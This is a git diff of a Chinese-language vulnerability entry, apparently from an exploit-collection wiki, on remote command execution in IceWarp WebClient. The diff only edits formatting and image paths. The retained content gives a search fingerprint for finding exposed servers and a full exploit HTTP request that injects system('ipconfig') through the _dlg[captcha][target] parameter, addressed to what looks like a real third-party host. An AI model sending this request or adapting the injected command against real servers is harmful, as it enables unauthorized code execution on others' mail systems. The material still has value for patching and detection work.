@@ -4,7 +4,7 @@
 
 IceWarp WebClient 存在远程命令执行漏洞，攻击者构造特殊的请求即可远程命令执行
 
-## 漏洞影响 
+## 漏洞影响
 
 ```
 IceWarp WebClient
@@ -20,13 +20,11 @@ app="IceWarp-公司产品"
 
 登录页面如下
 
-![](images/202202101850566.png)
-
-
+![](../.gitbook/assets/202202101850566.png)
 
 漏洞请求包为
 
-```plain
+```
 POST /webmail/basic/ HTTP/1.1
 Host: sd.sahadharawat.com
 Content-Type: application/x-www-form-urlencoded
@@ -36,6 +34,4 @@ Content-Length: 43
 _dlg[captcha][target]=system(\'ipconfig\')\
 ```
 
-
-
-![](images/202202101851258.png)
+![](../.gitbook/assets/202202101851258.png)
